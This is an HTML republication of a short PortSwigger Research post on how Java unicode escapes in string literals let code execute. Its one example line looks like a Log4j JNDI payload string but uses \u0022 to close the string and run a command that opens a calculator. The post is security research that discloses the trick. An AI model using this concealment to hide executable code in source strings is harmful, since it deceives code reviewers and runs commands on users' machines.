@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Hiding payloads in Java source code strings</title>
+<style>
+  body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; line-height: 1.55; color: #e2e8f0; max-width: 800px; margin: 26px auto; padding: 0 18px; background: #0a0e27; }
+  h1 { color: #00d9ff; margin-bottom: 0.35em; line-height: 1.22; font-size: clamp(1.45rem, 2.1vw, 1.95rem); font-weight: 700; }
+  h2, h3 { line-height: 1.28; margin: 1.1em 0 0.45em; }
+  .metadata { color: #94a3b8; font-size: 0.86em; margin-bottom: 1.2em; border-bottom: 1px solid rgba(0,217,255,0.2); padding-bottom: 0.7em; }
+  img { max-width: 100%; width: auto !important; height: auto !important; object-fit: contain !important; border-radius: 8px; display: block; margin: 0.6em auto; }
+  a { color: #00d9ff; }
+  p { margin-bottom: 0.72em; line-height: 1.58; }
+  ul, ol { margin: 0.5em 0 0.9em 1.1em; }
+  li { margin: 0.18em 0; }
+  blockquote { border-left: 3px solid #825ee4; padding-left: 12px; margin: 0.8em 0; color: #94a3b8; }
+  code { background: rgba(0,0,0,0.3); padding: 2px 6px; border-radius: 3px; color: #ff79c6; }
+  pre { background: rgba(0,0,0,0.4); padding: 12px; border-radius: 6px; overflow-x: auto; }
+  .article-elevator { position: fixed; right: 14px; bottom: 14px; display: flex; flex-direction: column; gap: 8px; z-index: 9999; }
+  .article-elevator-btn { width: 36px; height: 36px; border: 1px solid rgba(0,217,255,0.35); border-radius: 10px; background: rgba(10,14,39,0.88); color: #00d9ff; cursor: pointer; font-size: 16px; line-height: 1; }
+  .article-elevator-btn:hover { background: rgba(10,14,39,1); }
+</style>
+</head>
+<body>
+  <h1>Hiding payloads in Java source code strings</h1>
+  <div class="metadata">
+    Source: PortSwigger Research | Date: 1/23/2024 4:00:00 PM | Lang: EN |
+    <a href="https://portswigger.net/research/hiding-payloads-in-java-source-code-strings" target="_blank">Original Article</a>
+  </div>
+  <div class="content">
+    <div><div> <div> <p><img alt="Gareth Heyes" src="https://portswigger.net/content/images/profiles/callout_gareth_heyes_114px.png"></p>
+</div> <ul> <li> <p><span></span><strong>Published: </strong>23 January 2024 at 15:00 UTC</p> </li> <li> <p><strong>Updated: </strong>24 January 2024 at 12:27 UTC</p> </li> <li> </li> </ul> <p><img src="https://portswigger.net/cms/images/28/a4/c2e6-article-hidden-strings-article.png" alt="Twirling code that shows a calculator at the end to signify RCE"><br></p><p>In this post we'll show you how Java handles unicode escapes in source code strings in a way you might find surprising - and how you can abuse them to conceal payloads.
+</p><p>We recently released a powerful new feature called <a href="https://portswigger.net/blog/introducing-bambdas">Bambdas
+</a>. They allow you to filter items in Burp using Java code. But that got us wondering, what if you could convince a user to run a Bambda that looked like an honest exploit payload but actually executed arbitrary code on the local machine?</p><p>What do you expect would happen when you use the following in a Bambda:
+</p><p><code>var log4jpayload = "%24%7Bjndi:ldap://psres.net/\u0022;Runtime.getRuntime().exec(\u0022open -a calculator\u0022);//%7D";
+</code></p><p>If you were expecting a simple string assignment you'd be wrong. What actually happens is the Java compiler treats the unicode encoded double quote (\u0022) as a double quote and closes the string. Then Runtime.getRuntime() is executed along with the command passed with an encoded string. Java pretty much allows you to encode the entire syntax with unicode escapes!
+</p> </div></div>
+  </div>
+  <div class="article-elevator" aria-label="Navigation article">
+    <button class="article-elevator-btn" type="button" onclick="scrollToTop()">▲</button>
+    <button class="article-elevator-btn" type="button" onclick="scrollToBottom()">▼</button>
+  </div>
+  <script>
+    function scrollToTop() {
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+    }
+    function scrollToBottom() {
+      window.scrollTo({ top: document.documentElement.scrollHeight, behavior: 'smooth' });
+    }
+    window.addEventListener('message', (event) => {
+      const data = event && event.data;
+      if (!data || data.type !== 'AI_PULSE_SCROLL') return;
+      if (data.direction === 'top') scrollToTop();
+      if (data.direction === 'bottom') scrollToBottom();
+    });
+  </script>
+</body>
+</html>
